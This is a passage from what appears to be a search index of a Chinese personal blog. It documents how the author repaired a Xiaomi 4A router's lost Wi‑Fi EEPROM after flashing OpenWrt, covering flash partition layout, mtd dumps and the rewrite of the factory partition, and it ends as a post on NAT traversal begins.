sysupgrade.bin \u540e\uff0c\u53d8\u7816</li> <li>\u4f7f\u7528 breed \u6062\u590d\u5b98\u65b9 bootloader\uff0c\u6062\u590d\u5b98\u65b9\u56fa\u4ef6\uff0c\u4ecd\u7136\u6709\u4e0a\u9762\u95ee\u9898</li> <li>\u518d\u6b21\u5237 breed\uff0c\u6062\u590d\u7f16\u7a0b\u5668\u56fa\u4ef6 full.bin</li> <li>\u5237 openwrt sysupgrade.bin\uff0c\u53cd\u590d\u91cd\u542f\uff08\u9ec4\u706f\u4e0d\u4eae\uff09</li> <li>\u5237\u81ea\u5df1\u7f16\u8bd1\u7684 squashfs-sysupgrade.bin\uff0c\u53cd\u590d\u91cd\u542f</li> <li>\u53d1\u73b0 MAC \u5730\u5740\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u6062\u590d full.bin</li> <li>\u518d\u6b21\u5237\u81ea\u5df1\u7f16\u8bd1\u7684 squashfs-sysupgrade.bin\uff0c\u540c\u65f6\u52fe\u9009 EEPROM\uff0c\u53cd\u590d\u91cd\u542f</li> <li> <p>\u5237\u4e86\u7f51\u4e0a\u6559\u7a0b\u63d0\u4f9b\u7684\u6807\u660e\u4e3a mir3g \u7684\u56fa\u4ef6\uff08\u8fd9\u91cc\u53ef\u80fd\u5bfc\u81f4\u540e\u9762\u7684 factory \u5206\u533a\u524d\u79fb\u7684\u95ee\u9898\uff09\uff0c\u53ef\u4ee5\u542f\u52a8\uff0c\u4f46\u662f\u8c8c\u4f3c\u6ca1\u6709\u7f51\u901f\u3002\u5206\u533a\u5982\u4e0b\uff1a\uff08\u8bb0\u4f4f\u8fd9\u91cc\u7684 factory offset \u4e3a 0x40000\uff09    </p> </li> <li> <p>\u6700\u540e\u8fd8\u662f\u4e0d\u901a\u8fc7 breed \u5237\u56de\u4e86\u6211\u7684\u7cfb\u7edf\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a\u5b98\u65b9\u56fa\u4ef6 OS1 \u5206\u533a\u4e3a 13M\uff08\u4f46\u52a0\u4e0a\u5b98\u65b9\u56fa\u4ef6\u91cc\u591a\u51fa\u7684 disk \u5206\u533a\uff0c\u5927\u5c0f\u4e3a 14.5M\uff09\uff0c\u800c\u6211\u81ea\u5df1\u7f16\u8bd1\u7684\u955c\u50cf\u8d85\u8fc7\u4e86 13M\uff0c\u56e0\u6b64\u76f4\u63a5\u5237\u4f1a\u62a5\u9519\u3002\u4e8e\u662f\u6211\u5148\u5237\u5b98\u65b9\u955c\u50cf\uff0c\u518d\u5347\u7ea7\u4e3a\u6211\u7684\u955c\u50cf\uff0c\u6210\u529f\u3002\u7136\u800c\u8fd8\u662f\u6ca1\u6709\u89e3\u51b3\u95ee\u9898\u3002</p> </li> </ol>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7b2c\u4e8c\u6b21\u5c1d\u8bd5","title":"\u7b2c\u4e8c\u6b21\u5c1d\u8bd5","text":"<p>\u6211\u8fd8\u662f\u8ba4\u4e3a\u662f EEPROM \u4e22\u5931\u5bfc\u81f4\u7684\u95ee\u9898\uff0c\u60f3\u5230\u6211\u4e4b\u524d\u4fdd\u5b58\u4e86\u5b8c\u6574\u7684 flash \u5185\u5bb9\uff0c\u56e0\u6b64\u6211\u8003\u8651\u76f4\u63a5\u5728 openwrt \u4e2d\u5c06 flash \u5185\u5bb9 dump \u4e0b\u6765\uff0c\u548c\u4e4b\u524d\u4fdd\u5b58\u7684\u8fdb\u884c\u5bf9\u6bd4\u3002</p>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7406\u8bba","title":"\u7406\u8bba","text":"<p>\u8fd9\u6b21\u6211\u4ed4\u7ec6\u9605\u8bfb\u4e86 openwrt \u5b98\u65b9\u5173\u4e8e Flash Layout \u7684\u6587\u6863\uff08[OpenWrt Wiki] The OpenWrt Flash Layout\uff09\uff0c\u5176\u4e2d\u7684\u5185\u5bb9\u975e\u5e38\u4e30\u5bcc\uff0c\u4ecb\u7ecd\u4e86\uff1a</p> <ul> <li>flash \u53ef\u80fd\u4f1a\u56e0\u4e3aelectromigration,  whisker growth\u800c\"\u78e8\u635f\"\u3002</li> <li>raw flash \u548c FTL (Flash Translation Layer) flash \u7684\u533a\u522b<ul> <li>\u4e00\u4e2a\u76f4\u63a5\u63a5\u5165 SoC\uff08spi \u63a7\u5236\u5668\u4e5f\u7b97\uff1f\uff09\uff0c\u9700\u8981\u901a\u8fc7\u8f6f\u4ef6\u6765\u5904\u7406\u574f\u5757\u548c\u78e8\u635f\u5747\u8861</li> <li>\u800c\u53e6\u4e00\u4e2a\u5219\u5728 flash \u4e0a\u5305\u542b\u4e00\u4e2a\u786c\u4ef6\u6a21\u5757\uff0c\u6765\u5904\u7406\u574f\u5757\u548c\u78e8\u635f\u5747\u8861</li> <li>\u5d4c\u5165\u5f0f\u4e2d\u57fa\u672c\u90fd\u662f raw flash</li> </ul> </li> <li>NOR \u548c NAND \u7684\u533a\u522b<ul> <li>NOR flash \u4e00\u822c\u6bd4\u8f83\u5c0f\uff08\u5982 4MB-16MB\uff09\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u662ferror-free\u7684</li> <li>NAND flash \u901a\u5e38\u66f4\u5927\u4e9b\uff0832MB-256MB\uff09\uff0c\u4e0d\u662ferror-free\u7684\uff0c\u9700\u8981\u5904\u7406\u574f\u5757 <ol> <li>the manufacturer of the \u201craw NAND flash\u201d has to guarantee that certain erase blocks are error-free:<ul> <li>namely the one(s) which the bootloader is to be written to</li> <li>but also the ones which the Linux kernel and the SquashFS are to be written to, because the firmware image file is generated on some desktop computer, that cannot know which erase blocks of the \u201craw NAND flash\u201d of the device are bad.</li> </ul> </li> <li>the Image Generator has be constrained to build only file sizes that are equal or smaller than the size of the area of the \u201craw NAND flash\u201d, that consists of guaranteed error-free erase blocks.</li> <li>OpenWrt would replace JFFS2 with UBIFS, and the entire area of the \u201craw NAND flash\u201d, that consists of potentially bad erase blocks, would be written to exclusively from an installed OpenWrt system through UBIFS.</li> </ol> </li> </ul> </li> <li>flash \u7684\u5206\u533a <p>The available storage is not partitioned in the traditional way, where you store the data about the partitions in the MBR and PBRs, but it is done in the Linux Kernel (and sometimes independently in the bootloader as well!). It's simply defined, that \u201cpartition <code>kernel</code> starts at offset <code>x</code> and ends at offset <code>y</code>\u201d. Using names allows convenient addressing of partitions by name instead of giving the start offset over and over again.</p> </li> <li>\u4ec0\u4e48\u662f MTD\uff1aMemory Technology Device - Wikipedia</li> <li> <p>openwrt \u6587\u4ef6\u7cfb\u7edf\u4f8b\u5b50   </p> </li> </ul>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#explanations","title":"Explanations","text":"<p>The Linux kernel treats \u201craw flash memory\u201d (no matter whether NOR or NAND) chips as an MTD (Memory Technology Device) and employs filesystems developed for this purpose on top of the MTD layer.</p> <p>Since the partitions are nested we look at this whole thing in layers:</p> <ol> <li>Layer0: So we have the Flashchip, 8\u202fMiB in size, which is soldered to the PCB and connected to the soc over SPI (Serial Peripheral Interface Bus).</li> <li>Layer1: We \u201cpartition\u201d the space into mtd0 for the bootloader, mtd5 for OpenWrt and, in this case, mtd4 for the ART (Atheros Radio Test) - it contains calibration data for the wifi (EEPROM). If it is missing or corrupt, <code>ath9k</code> (wireless driver) won't come up anymore. The bootloader (128\u202fKiB) contains of the u-boot 64KiB block AND a data section which contains the MAC, WPS-PIN and type description. If no MAC is configured ath9k will not work correctly due to a faulty MAC.</li> <li>Layer2: we subdivide mtd5 (firmware) into mtd1 (kernel) and mtd2 (rootfs); In the generation process of the firmware (see imagebuilder) the Kernel binary file is first packed with LZMA, then the obtained file is packed with gzip and then this file will be written onto the raw flash (mtd1) without being part of any filesystem! During boot, u-boot copies this entire section into RAM and executes it. From there on, the Linux kernel bootstraps itself\u2026</li> <li>Layer3: we subdivide rootfs even further into mtd3 for rootfs_data and the rest for an unnamed partition which will accommodate the SquashFS-partition.</li> </ol>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#mount-points","title":"Mount Points","text":"<ul> <li><code>/</code> this is your entire root filesystem, it comprises <code>/rom</code> and <code>/overlay</code>. Please ignore <code>/rom</code> and <code>/overlay</code> and use exclusively <code>/</code> for your daily routines!</li> <li><code>/rom</code> contains all the basic files, like <code>busybox</code>, <code>dropbear</code> or <code>iptables</code>. It also includes default configuration files used when booting into OpenWrt Failsafe mode. It does not contain the Linux kernel. All files in this directory are located on the SqashFS partition, and thus cannot be altered or deleted. But, because we use overlay_fs filesystem, overlay-whiteout-symlinks can be created on the JFFS2 partition.</li> <li><code>/overlay</code> is the writable part of the file system that gets merged with <code>/rom</code> to create a uniform <code>/</code>-tree. It contains anything that was written to the router after installation, e.g. changed configuration files, additional packages installed with <code>opkg</code>, etc. It is formated with JFFS2.</li> </ul> <p>Whenever the system is asked to look for an existing file in <code>/</code>, it first looks in <code>/overlay</code>, and if not there, then in <code>/rom</code>. In this way <code>/overlay</code> overrides <code>/rom</code> and creates the effect of a writable <code>/</code> while much of the content is safely and efficiently stored in the read-only <code>/rom</code>.</p>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5b9e\u8df5","title":"\u5b9e\u8df5","text":"<p>Windows \u4e0b\u6211\u4f7f\u7528\u4e86Free Hex Editor: Fastest Binary File Editing Software. Freeware. Windows (hhdsoftware.com)\u6765\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\u4fe1\u606f</p> <ol> <li> <p>\u9996\u5148\u67e5\u770b flash \u5206\u533a\u4fe1\u606f    \u53ef\u4ee5\u901a\u8fc7<code>cat /proc/mtd</code>\u6765\u67e5\u770b mtd \u5206\u533a\uff0c\u4e0d\u8fc7\u5176\u4e2d\u6709\u4e9b\u5206\u533a\u662f\u91cd\u53e0\u7684\u3002\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7<code>dmsg</code>\u6765\u67e5\u770b\u7cfb\u7edf\u7684\u542f\u52a8\u4fe1\u606f\uff0c\u627e\u5230\u5176\u4e2d\u7684 mtd \u4fe1\u606f\uff0c\u5982\u4e0b\uff1a</p> <pre><code>[    0.615097] Creating 8 MTD partitions on \"spi0.0\":\n[    0.619893] 0x000000000000-0x000000030000 : \"u-boot\"\n[    0.626143] 0x000000030000-0x000000040000 : \"u-boot-env\"\n[    0.632722] 0x000000040000-0x000000050000 : \"Bdata\"\n[    0.638791] 0x000000050000-0x000000060000 : \"factory\"\n[    0.645206] 0x000000060000-0x000000070000 : \"crash\"\n[    0.651386] 0x000000070000-0x000000080000 : \"cfg_bak\"\n[    0.657804] 0x000000080000-0x000000180000 : \"overlay\"\n[    0.664113] 0x000000180000-0x000001000000 : \"firmware\"\n[    0.670710] 2 uimage-fw partitions found on MTD device firmware\n[    0.676656] Creating 2 MTD partitions on \"firmware\":\n[    0.681625] 0x000000000000-0x00000024d580 : \"kernel\"\n[    0.687745] 0x00000024d580-0x000000e80000 : \"rootfs\"\n[    0.693746] mtd: device 9 (rootfs) set to be root filesystem\n[    0.699502] 1 squashfs-split partitions found on MTD device rootfs\n[    0.705684] 0x000000d30000-0x000000e80000 : \"rootfs_data\"\n[    0.713298] libphy: Fixed MDIO Bus: probed\n[    0.743012] libphy: mdio: probed\n[    0.746455] mt7530 mdio-bus:1f: MT7530 adapts as multi-chip module\n[    0.755279] mtk_soc_eth 1e100000.ethernet: generated random MAC address aa:f9:37:65:6e:50\n[    0.764330] mtk_soc_eth 1e100000.ethernet eth0: mediatek frame engine at 0xbe100000, irq 21\n[    0.774735] mt7621-pci 1e140000.pcie: Parsing DT failed\n</code></pre> <p>\u53ef\u548c\u5b98\u65b9\u56fa\u4ef6\u4f5c\u5bf9\u6bd4\uff08\u542f\u52a8\u4fe1\u606f\u4ece openwrt \u5bf9\u5e94\u8bbe\u5907\u9875\u9762\u83b7\u5f97\uff09\uff1a</p> <pre><code>[    2.280000] flash manufacture id: c8, device id 40 18\n[    2.280000] GD25Q128C(c8 40180000) (16384 Kbytes)\n[    2.280000] mtd .name = raspi, .size = 0x01000000 (16M) .erasesize = 0x00010000 (64K) .numeraseregions = 0\n[    2.280000] Creating 10 MTD partitions on \"raspi\":\n[    2.280000] 0x000000000000-0x000001000000 : \"ALL\"\n[    2.280000] 0x000000000000-0x000000030000 : \"Bootloader\"\n[    2.280000] 0x000000030000-0x000000040000 : \"Config\"\n[    2.280000] 0x000000040000-0x000000050000 : \"Bdata\"\n[    2.280000] 0x000000050000-0x000000060000 : \"Factory\"\n[    2.290000] 0x000000060000-0x000000070000 : \"crash\"\n[    2.290000] 0x000000070000-0x000000080000 : \"cfg_bak\"\n[    2.290000] 0x000000080000-0x000000180000 : \"overlay\"\n[    2.290000] 0x000000180000-0x000000e80000 : \"OS1\"\n[    2.290000] mtd: try split OS1 partition\n[    2.290000] mtd: split_firmware\n[    2.290000] mtd: firmware_partition-&gt;size   0xd00000\n[    2.290000] mtd: firmware_partition-&gt;offset 0x180000\n[    2.290000] mtd: uimage_len 1855601\n[    2.290000] mtd: uimage_len 1900544\n[    2.290000] mtd: rootfs_partition-&gt;size   0xb30000\n[    2.290000] mtd: rootfs_partition-&gt;offset 0x350000\n[    2.290000] mtd: partition \"rootfs\" created automatically, ofs=350000, len=B30000\n[    2.290000] 0x000000350000-0x000000e80000 : \"rootfs\"\n[    2.290000] 0x000000e80000-0x000001000000 : \"disk\"\n</code></pre> </li> <li> <p>\u7136\u540e dump \u5b8c\u6574\u7684 flash\uff08\u4e4b\u524d\u901a\u8fc7 breed \u4fdd\u5b58\u7684 EEPROM \u4e3a eeprom.bin\uff0c\u5b8c\u6574 flash \u4e3a full.bin\uff09</p> <pre><code>cat /dev/mtd0 &gt; dump.bin\ncat /dev/mtd1 &gt;&gt; dump.bin\ncat /dev/mtd2 &gt;&gt; dump.bin\ncat /dev/mtd3 &gt;&gt; dump.bin\ncat /dev/mtd4 &gt;&gt; dump.bin\ncat /dev/mtd5 &gt;&gt; dump.bin\ncat /dev/mtd6 &gt;&gt; dump.bin\ncat /dev/mtd7 &gt;&gt; dump.bin\n</code></pre> </li> <li> <p>\u53d1\u73b0 eeprom.bin \u7684\u5927\u5c0f\u4e3a 64KB\uff0c\u521a\u597d\u5bf9\u5e94 0x10000 \u7684\u5927\u5c0f\u3002\u901a\u8fc7\u5728 full.bin \u4e2d\u67e5\u627e eeprom.bin \u5185\u5bb9\uff0c\u5bb9\u6613\u5b9a\u4f4d\u5230 Factory(0x50000) \u8fd9\u4e2a\u5206\u533a\u3002\u53d1\u73b0 Factory \u5206\u533a\u4e2d\u5373\u5b58\u50a8\u4e86 EEPROM \u5185\u5bb9\u3002    </p> </li> <li> <p>\u7136\u800c openwrt \u76f4\u63a5 dump \u4e0b\u6765\u7684\u6587\u4ef6\u4e2d\uff0c\u76f8\u540c\u7684\u5185\u5bb9\uff0c\u4f4d\u7f6e\u5374\u5b9a\u4f4d\u5230\u4e86 Bdata(0x40000) \u8fd9\u4e2a\u5206\u533a    </p> </li> <li>\u5bf9\u6bd4\u5176\u4ed6\u5206\u533a\uff0c\u53ef\u4ee5\u53d1\u73b0\uff1a<ul> <li>(0x00000-0x30000)Bootloader \u5bf9\u5e94 u-boot    </li> <li>(0x30000-0x40000)Config \u5bf9\u5e94 u-boot-env    </li> <li>(0x80000-0x180000)overlay \u548c overlay \u76f8\u5bf9\u5e94    </li> <li>\u4e2d\u95f4\u7684\u5185\u5bb9\u4e24\u8fb9\u90fd\u4e0d\u540c\uff0c\u6bd4\u8f83\u660e\u663e\u7684\u662f dump.bin \u4e2d Bdata \u5b58\u50a8\u4e86 Factory \u5185\u5bb9\uff0c\u800c Factory \u7684\u5185\u5bb9\u672a\u77e5\u3002</li> </ul> </li> <li> <p>\u56e0\u6b64\u8003\u8651\u5c06 eeprom.bin \u5185\u5bb9\u5728 openwrt \u4e2d\u91cd\u65b0\u5199\u5165\u5230 Factory \u4e2d    \u7136\u800c\u76f4\u63a5 mtd write \u4f1a\u62a5\u4ee5\u4e0b\u9519\u8bef        \u641c\u7d22\u540e\u53d1\u73b0\u9700\u8981\u5b89\u88c5\u5185\u6838\u6a21\u5757<code>kmod-mtd-rw</code>\uff0c\u7531\u4e8e\u81ea\u5df1\u7f16\u8bd1\u7684\u5185\u6838 hash \u503c\u548c\u5b98\u65b9\u7248\u672c\u4e0d\u4e00\u81f4\uff0c\u4e8e\u662f\u6211\u91cd\u65b0\u7f16\u8bd1\u4e86 openwrt \u955c\u50cf    \u7136\u540e\u8fd0\u884c\u547d\u4ee4 I WANT A BRICK!!!</p> <pre><code>insmod mtd-rw i_want_a_brick=1\n</code></pre> <p>\u4e8e\u662f\u6211\u4eec\u4fbf\u53ef\u4ee5\u6109\u5feb\u5730\u89e3\u9501\u5206\u533a\u4e86\uff0c\u5199\u5165 eeprom \u5373\u53ef</p> </li> </ol> <pre><code>mtd -r write eeprom.bin factory\n</code></pre> <ol> <li>\u7ed3\u675f\uff0c\u5199\u5b8c\u540e\uff0c\u6211\u7684 5GHz \u65e0\u7ebf\u7ec8\u4e8e\u6062\u590d\u6b63\u5e38\u4e86\uff01</li> </ol>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u540e\u8bb0","title":"\u540e\u8bb0","text":"<p>\u867d\u7136\u89e3\u51b3\u4e86\u95ee\u9898\uff0c\u4f46\u5176\u5b9e\u8fd8\u6709\u4e00\u4e9b\u7591\u95ee\uff1a</p> <ol> <li>\u4f7f\u7528 breed \u65e0\u6cd5\u6210\u529f\u5237 breed\u3002\u4f7f\u7528\u7684 breed \u6709\u4e24\u4e2a\u7248\u672c\uff0c\u770b\u522b\u4eba\u7684\u6559\u7a0b\u8bf4 r3g \u548c mi4a \u767e\u5146\u7248\u4f7f\u7528\u4e0b\u9762\u7684\u7248\u672c\uff0cmi4a \u5343\u5146\u7248\u672c\u4f7f\u7528\u4e0a\u9762\u7684\u7248\u672c\u3002        \u7136\u800c\u4f7f\u7528 breed \u65f6\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u4e0a\u9762\u6807\u7684\u95ea\u5b58\u5e03\u5c40 0x50000 \u5e76\u4e0d\u5bf9\u5e94 OS1 \u7684\u5730\u5740\uff0c\u6240\u4ee5\u611f\u89c9\u4e0d\u5e94\u8be5\u4f7f\u7528\u8fd9\u4e2a\u7248\u672c\u7684 breed\uff01\uff08\u6240\u4ee5\u4e0a\u9762\u53d1\u751f\u7684\u95ee\u9898\u4f1a\u4e0d\u4f1a\u662f\u7528\u9519\u7248\u672c breed \u5bfc\u81f4\u7684\uff1f\uff09breed \u4e0a\u4e5f\u6ca1\u6709\u8bf4\u660e\u662f\u5426\u652f\u6301 mi4aIndex of / (hackpascal.net) </li> <li>\u5370\u8c61\u4e2d\u539f\u672c\u53f0\u5f0f\u63d2\u4e0a\u8def\u7531\u5668\u6d4b\u7f51\u901f\u662f\u80fd\u8dd1\u4e0a 1000M \u7684\uff0c\u4f46\u662f\u73b0\u5728\u53f0\u5f0f\u76f4\u63d2\u5bdd\u5ba4\u7f51\u53e3\u4e0b\u8f7d\u901f\u7387\u53ef\u4ee5\u8dd1\u5230 960M\uff0c\u800c\u63d2\u4e0a\u8def\u7531\u5668\u5374\u53ea\u6709 600M \u5de6\u53f3\uff0c\u611f\u89c9\u635f\u5931\u633a\u5927\u7684\u3002\u4e0d\u77e5\u662f\u4e0d\u662f\u8def\u7531\u5668\u8fd8\u6709\u6f5c\u5728\u95ee\u9898\u3002\uff08\u96be\u9053\u662f block \u8bbe\u7f6e\u4e3a 512KB \u62d6\u6162\u4e86\u901f\u5ea6\uff1f\uff09</li> <li>\u53ef\u4ee5\u770b\u5230\u8def\u7531\u5206\u533a\u4e2d\u9664\u4e86 u-boot, u-boot-env, Factory, firmware\uff0c\u5176\u4ed6\u90e8\u5206\u611f\u89c9\u90fd\u662f\u6ca1\u7528\u7684\uff0c\u8fd9\u90e8\u5206\u662f\u5426\u80fd\u5229\u7528\u8d77\u6765\uff1f\u6bd4\u5982\u90a3\u4e2a\u7d27\u6328 firmware \u7684 overlay \u5206\u533a\u611f\u89c9\u662f\u6ca1\u8d77\u4f5c\u7528\u7684\uff0c\u4f46\u662f\u5360\u4e86 1M \u7684\u5927\u5c0f\u3002crash \u548c cfg_back \u4e5f\u53ef\u4ee5\u83b7\u5f97 128KB \u7684\u7a7a\u95f4\u3002</li> </ol>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u540e\u8bb0-2","title":"\u540e\u8bb0 2","text":"<p>\u4e4b\u524d\u6298\u817e vlan \u65f6\uff0c\u4e00\u4e0d\u6ce8\u610f\u5c31\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\u5230\u8bbe\u5907\u4e86\u3002\u9700\u8981\u53cd\u590d\u5237 op\uff0c\u56e0\u6b64\u60f3\u4f7f\u7528 breed \u6765\u7b80\u5316\u5237 op \u8fc7\u7a0b\u3002\u4f46\u5176\u5b9e breed \u5b98\u65b9\u6839\u672c\u6ca1\u6709\u5bf9 mi4a \u5343\u5146\u7248\u505a\u652f\u6301\uff0c\u53ea\u662f\u56e0\u4e3a\u5176 flash \u5206\u533a\u548c WR1200JS \u4e00\u6837\uff0c\u6240\u4ee5\u7f51\u4e0a\u90fd\u4f7f\u7528\u90a3\u4e2a\u7248\u672c\u7684 breed\uff0c\u5f53\u65f6\u6211\u89c9\u5f97 mi4a \u7684\u786c\u4ef6\u548c r3g \u4e00\u6478\u4e00\u6837\uff0c\u56e0\u6b64\u89c9\u5f97\u5237 r3g \u7684\u5e94\u8be5\u4e5f\u53ef\u4ee5\u3002\u7ed3\u679c\u5237\u5b8c\u540e\u5c31\u53d8\u7816\u4e86\uff0c\u5b98\u65b9\u6062\u590d\u5de5\u5177\u4e5f\u65e0\u6cd5\u6062\u590d\u3002\u540e\u9762\u624d\u610f\u8bc6\u5230\u4e0a\u9762\u7684\u95ee\u9898\uff0cbreed \u7684 flash \u5206\u533a\u548c openwrt \u7684\u4e0d\u4e00\u6837\u3002</p> <p>\u8fc7\u4e86\u534a\u5b66\u671f\uff0c\u6211\u4e70\u4e86 ch341a \u7f16\u7a0b\u5668\uff0c\u53ef\u4ee5\u76f4\u63a5\u5237 flash\uff0c\u56e0\u6b64\u53ef\u4ee5\u628a mi4a \u6551\u56de\u6765\u4e86\u3002\u4f46\u662f\u53d1\u73b0\u4e4b\u524d\u5907\u4efd\u7684 eeprom \u88ab\u6211\u5220\u4e86\uff0c\u7136\u540e\u4f7f\u7528\u7f16\u7a0b\u5668\u7684\u65f6\u5019\uff0c\u5728\u610f\u8bc6\u5230\u9700\u8981\u5148\u5907\u4efd\u65f6\u5df2\u7ecf\u70b9\u4e86\u64e6\u9664\u3002\u6240\u4ee5\u65e0\u5948\u53ea\u80fd\u5728\u7f51\u4e0a\u627e\u4e86\u522b\u4eba\u63d0\u4f9b\u7684 eeprom\u3002\u60f3\u5230 mi4a \u662f\u6211\u7b2c\u4e00\u4e2a openwrt \u7684\u8bbe\u5907\uff0c\u6211\u5bf9\u5b83 SLAAC \u7684 ipv6 \u5730\u5740\u5370\u8c61\u6df1\u523b\uff08123d \u7ed3\u5c3e\uff09\uff0c\u800c\u73b0\u5728\u6ca1\u529e\u6cd5\u6062\u590d\u4e86\uff0c\u4e0d\u514d\u6709\u70b9\u611f\u4f24\u3002</p> <p>\u5982\u679c\u8981\u7528 breed \u5237 openwrt \u7684\u8bdd\uff0c\u9700\u8981\u4fee\u6539 op \u7684 flash \u5206\u533a\uff1a</p> <ul> <li>\u8fd9\u91cc\u63d0\u4f9b\u4e86\u522b\u4eba\u7f16\u8bd1\u597d\u7684\uff1a[20210919 \u66f4\u65b0]\u5c0f\u7c73\u8def\u7531 4A \u5343\u5146\u7248 LEDE \u56fa\u4ef6_\u96c6\u6210\u5feb\u4e50\u4e0a\u7f51\u3001\u5185\u7f51\u7a7f\u900f\u3001KMS\u3001\u7f51\u7edc\u52a0\u901f - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> <li>\u8fd9\u91cc\u662f\u5982\u4f55\u81ea\u5df1\u4fee\u6539\uff1a\u5206\u4eab\u5c0f\u7c73 R4A \u5343\u5146\u7248\u7f16\u8bd1 OPENWRT(Breed \u76f4\u5237\u7248)-OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> </ul> <p>\u4f46\u662f\u60f3\u60f3\u8fd8\u662f\u7b97\u4e86\uff0c\u4e3a\u4ec0\u4e48\u8981\u60f3\u529e\u6cd5\u53bb\u7528\u4e00\u4e2a\u5b98\u65b9\u4e0d\u652f\u6301\u7684\u4e1c\u897f\u5462\uff1f\uff08\u9020\u6210\u8fd9\u4e00\u5207\u60b2\u5267\u7684\u6e90\u5934\uff09</p>","tags":["openwrt","breed","flash \u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","title":"\u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f","text":"","tags":["\u5185\u7f51\u7a7f\u900f","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/11/2022-02-11-%E4%B8%8D%E5%90%8C%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#\u6280\u672f\u8bf4\u660e","title":"\u6280\u672f\u8bf4\u660e","text":"<ul> <li>ddns\uff1a\u5c06\u52a8\u6001\u7684\u516c\u7f51 ip \u5730\u5740\u7ed1\u5b9a\u5230\u4e00\u4e2a\u57df\u540d\u4e0a</li> <li>\u901a\u8fc7 VPN \u8bbf\u95ee\u5185\u7f51\uff1a\u5728\u4e92\u8054\u7f51\u4e0a\u5efa\u7acb\u4e00\u4e2a\u96a7\u9053\uff0c\u901a\u8fc7\u96a7\u9053\u53ef\u5b9e\u73b0\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907</li> <li>\u7aef\u53e3\u8f6c\u53d1\uff1a\u5c06\u53d1\u9001\u7ed9 A \u7684\u67d0\u4e2a\u7aef\u53e3\u7684\u6570\u636e\u8f6c\u53d1\u7ed9 B \u7684\u67d0\u4e2a\u7aef\u53e3\u3002\u5bf9\u4e8e\u8bbf\u95ee\u8005\u6765\u8bf4\uff0c\u8bbf\u95ee\u7684\u662f A\uff0c\u5b9e\u9645\u54cd\u5e94\u7684\u662f B</li> 